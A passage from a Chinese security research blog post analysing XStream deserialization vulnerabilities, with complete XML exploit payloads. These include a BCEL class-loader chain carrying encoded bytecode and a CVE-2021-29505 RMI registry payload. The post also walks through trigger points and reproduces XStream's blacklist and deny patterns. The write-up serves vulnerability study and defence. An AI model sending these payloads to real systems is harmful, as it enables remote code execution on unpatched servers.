      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

需要注意的是：

1.  低版本的jdk中没有__overrideDefaultParser，在8u121上测试失败，8u172上成功，8u251测试失败，原因是高版本jdk jndi注入受JEP290影响。

### [](#分析-5 "分析")分析

这个也是ysomap中的XercesValue payload。

触发点在IncrementalSAXSource_Xerces.parseSome

```java
private boolean parseSome()
                throws SAXException, IOException, IllegalAccessException,
                                         java.lang.reflect.InvocationTargetException
        {
                // Take next parsing step, return false iff parsing complete:
                if(fConfigSetInput!=null)
                {
                        Object ret=(Boolean)(fConfigParse.invoke(fPullParserConfig,parmsfalse));
```

其中fConfigParse、fPullParserConfig、parmsfalse都可控

### [](#黑名单：-6 "黑名单：")黑名单：

```java
denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
```

[](#ServiceFinder-LazyIterator "ServiceFinder$LazyIterator")ServiceFinder$LazyIterator
--------------------------------------------------------------------------------------

### [](#POC-6 "POC")POC

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="java.util.ServiceLoader$LazyIterator">
                  <service>java.lang.Object</service>
                  <loader class="com.sun.org.apache.bcel.internal.util.ClassLoader">
                    <package2certs class="hashtable"/>
                    <classes defined-in="java.lang.ClassLoader"/>
                    <defaultDomain>
                      <principals/>
                      <hasAllPerm>false</hasAllPerm>
                      <staticPermissions>false</staticPermissions>
                      <key>
                        <outer-class reference="../.."/>
                      </key>
                    </defaultDomain>
                    <domains/>
                    <packages/>
                    <nativeLibraries/>
                    <defaultAssertionStatus>false</defaultAssertionStatus>
                    <classes>
                      <entry>
                        <string>java.lang.Object</string>
                        <java-class>java.lang.Object</java-class>
                      </entry>
                      <entry>
                        <string>java.lang.Runtime</string>
                        <java-class>java.lang.Runtime</java-class>
                      </entry>
                    </classes>
                    <ignored__packages/>
                    <repository class="com.sun.org.apache.bcel.internal.util.SyntheticRepository">
                      <__path>
                        <paths/>
                        <class__path></class__path>
                      </__path>
                      <__loadedClasses/>
                    </repository>
                  </loader>
                  <nextName>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$90$cdJ$c3$40$U$85$cfm$ab$a91$d5$fe$d8V$c1E$5d$d9$K$fd3$a4$b5T$dc$I$ae$y$8a$V$5dO$c7$a1$a4$c6$q$a4S$f5$8d$5c$bbQq$e1$D$f8P$ea$8d$I$W$c4$Z8$c3$bd$dc$f3$9d$99y$ffx$7d$D$60c$83P$O$ef$fc$fa$ae$d3$ea$ed$f5$da$b6c$b7z$dd$8e$e3t$ba$b6$B$od$t$e2V4$3d$e1$8f$9b$t$a3$89$92$da$40$92$60$O$83Y$q$d5$91$eb$v$c2$e6$3f$feFl$r$y$ee$bb$be$ab$P$I$c9j$ed$c2$82$81$b4$89$U$96$I$a9$c3$e0$8a$ed$b9$df$84$b3$99$af$dd$he$c0$e2$88$b1$d2$3f5$a1X$ad$j$ff$Z$eb$5bX$c1$aa$89$M$b2$84R$Q$w$bfR$X$V$v$3c9$f3$84$O$a2$86$I$c34$f2$i$a4$ee$95$qlW$e7$YC$j$b9$fe$b8$3f$8f$3d$8d$C$a9$a6S$c6$ae$a1$YcK$84$ccP$Ly$3d$Q$e1$b9$Yy$K$5bH$f0$dd$e3E$bc$f9$v$ac$cb$5c$b5$b9$9b$e4$b3$b0$f3$M$f3$81$7fh$f0$82$5c$be$f0$84$f2$e5$e3$f7$f0$3a$ab$F$fad$P$Z$M$89$7b$L$ac$J$y$7e$B$e0$d2$95$ea$8b$B$A$A</nextName>
                  <outer-class/>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

### [](#分析-6 "分析")分析

重点是Wh1t3p1g师傅BCEL的 classLoader的构造思路及过程，可看师傅原博。

### [](#黑名单：-7 "黑名单：")黑名单：

```java
private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");
private static final Pattern LAZY_ITERATORS = Pattern.compile(".*\\$LazyIterator");
denyTypeHierarchy(InputStream.class);
denyTypeHierarchyDynamically("javax.activation.DataSource");
```

[](#CVE-2021-29505 "CVE-2021-29505")CVE-2021-29505
--------------------------------------------------

```plain
<map>
  <entry>
    <string>foo</string>
    <string>foo</string>
  </entry>
  <entry>
    <com.sun.jndi.rmi.registry.BindingEnumeration>
      <ctx>
        <environment/>
        <registry class="sun.rmi.registry.RegistryImpl_Stub" serialization="custom">
          <java.rmi.server.RemoteObject>
            <string>UnicastRef</string>
            <string>127.0.0.1</string>
            <int>1099</int>
            <long>0</long>
            <int>0</int>
            <long>0</long>
            <short>0</short>
            <boolean>false</boolean>
          </java.rmi.server.RemoteObject>
        </registry>
        <host>127.0.0.1</host>
        <port>1099</port>
      </ctx>
      <names>
        <string>aa</string>
      </names>
      <nextName>0</nextName>
    </com.sun.jndi.rmi.registry.BindingEnumeration>
    <com.sun.jndi.rmi.registry.BindingEnumeration reference="../com.sun.jndi.rmi.registry.BindingEnumeration"/>
  </entry>
</map>
```

[](#XStream的防御措施 "XStream的防御措施")XStream的防御措施
--------------------------------------------

### [](#黑名单 "黑名单")黑名单

在>1.4.6之后的版本中，XStream引入了安全机制，以避免反序列化问题。

Wh1t3p1g师傅《回顾XStream反序列化漏洞》一文中0x03一节中解释得很好了，这里不赘述。贴一下参考【2】中提到的最新版1.4.16的黑名单。

```java
private static final String ANNOTATION_MAPPER_TYPE = "com.thoughtworks.xstream.mapper.AnnotationMapper";
private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
private static final Pattern PRIVILEGED_GETTER = Pattern.compile(".*\\$PrivilegedGetter");
private static final Pattern LAZY_ITERATORS = Pattern.compile(".*\\$LazyIterator");
private static final Pattern JAXWS_ITERATORS = Pattern.compile(".*\\$ServiceNameIterator");
private static final Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile("javafx\\.collections\\.ObservableList\\$.*");
private static final Pattern JAVAX_CRYPTO = Pattern.compile("javax\\.crypto\\..*");
private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");

protected void setupSecurity() {
    if (this.securityMapper != null) {
        this.addPermission(AnyTypePermission.ANY);
        this.denyTypes(new String[]{"java.beans.EventHandler", "java.lang.ProcessBuilder", "javax.imageio.ImageIO$ContainsFilter", "jdk.nashorn.internal.objects.NativeString", "com.sun.corba.se.impl.activation.ServerTableEntry", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator", "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "sun.swing.SwingLazyValue"});
        this.denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL});
        this.denyTypeHierarchy(InputStream.class);
        this.denyTypeHierarchyDynamically("java.nio.channels.Channel");
        this.denyTypeHierarchyDynamically("javax.activation.DataSource");
        this.denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
        this.allowTypeHierarchy(Exception.class);
        this.securityInitialized = false;
    }
}
```

自此，把基于jdk的现有已知链都block掉了。第三方的链（如Groovy）还在存活中，之后的发展趋势，不知道会不会类似fastjson/jackson之类的，开始漫长的block三方链。

### [](#白名单 "白名单")白名单

XStream在1.4.10版本增加了setupDefaultSecurity方式来设置默认的白名单，仅默认支持基础类的实例化。

[](#小结 "小结")小结
--------------

本节复现了1.4.6之后的几个POC，主要是跟踪RCE漏洞触发点，至于链是如何构造的本节未做研究，这个作为下节的内容重点研究研究。

过程中遗留了1个现在解决不了的问题，CVE-2021-21347 8u60下的URLClassLoader构造存在问题，未解决，如果有大佬遇到并解决，求分享，不胜感激。

#### [](#总结下XStream的反序列化特点 "总结下XStream的反序列化特点")总结下XStream的反序列化特点

1.  在Java原生反序列化中，可实例化的类必须是Serializable的，但是XStream不受限制所有类都可以实例化，这点和fastjson/jackson之类的一样。
    
2.  fastjson/jackson实现类属性赋值，都是通过getsettr/setsettr来实现的（只是有些调用条件不同），XStream是通过Conveter的逻辑来实现（SerializableConveter也支持Java原生反序列化readObject）。
    
    *   为什么fastjson/jackson 存在jdk反序列化链没有XStream的多？因为并不是所有的类的属性都严格实现了get/set，导致很多jdk类不能完全还原。
3.  XStream的某些Conveter是存在问题的
    
    *   MapConverter/TreeSetConveter/TreeMapConveter都会触发这些集合/表 内元素的内部函数，比如compare、hashcode、equal这些函数。
    *   DynamicProxyConverter 代理类，InvocationHandler可控，导致一些invoke存在RCE风险的InvocationHandler类，如EventHandler，可以加以利用。

#### [](#总结下RCE触发点 "总结下RCE触发点")总结下RCE触发点

1.  invoke 实现上有问题的 InvokeHandler，如
    *   EventHandler
    *   搭配MethodClosure的ConvertedClosure
2.  hashCode、compare、equal实现有问题的Map/Set/Queue，如
    *   Expando，hashCode搭配MethodClosure可以RCE
    *   CVE-2021-21345 ServerTableEntry verify方法可RCE
3.  存在invoke，且method、obj可控的class（这一类普遍存在）
    *   CVE-2020-26217 ImageIO$ContainsFilter，filter方法内可控
    *   CVE-2021-21344 Accessor$GetterSetterReflection，get方法可控
    *   CVE-2021-21351 IncrementalSAXSource_Xerces parseSome方法内invoke可控
4.  利用ClassLoader实例化
    *   ServiceLoader$LazyIterator，调用点为Class.forName (name,initialize,loader) ，指定loader为BCEL classLoaer
    *   CVE-2021-21347，调用点为loader.loadClass(name).newInstance()，利用java.net.URLClassLoader加载远程jar类并实例化
    *   CVE-2021-21350，和LazyIterator一样，利用BCEL classLoader

#### [](#总结下Bullet-ysomap概念 "总结下Bullet(ysomap概念)")总结下Bullet(ysomap概念)

1.  ProcessBuilder.start() 无参数
2.  Runtime.getRuntime().exec(cmd) 有参
3.  JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) 无参
4.  MethodClosure.call() 无参

有参的case比较少见，GroovyConvertedClosure是一例

[](#参考 "参考")参考
--------------

*   \[1\] [回顾XStream反序列化漏洞](https://www.anquanke.com/post/id/204314)
*   \[2\] [Xstream 反序列化远程代码执行漏洞深入分析](https://paper.seebug.org/1543/)
*   \[3\] [CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html)
*   \[4\] [CVE-2021-21344](https://x-stream.github.io/CVE-2021-21344.html)
*   \[5\] [CVE-2021-21345](https://x-stream.github.io/CVE-2021-21345.html)
*   \[6\] [CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html)
*   \[7\] [CVE-2021-21347](https://x-stream.github.io/CVE-2021-21347.html)
*   \[8\] [CVE-2021-21350](https://x-stream.github.io/CVE-2021-21350.html)
*   \[9\] [CVE-2021-21351](https://x-stream.github.io/CVE-2021-21351.html)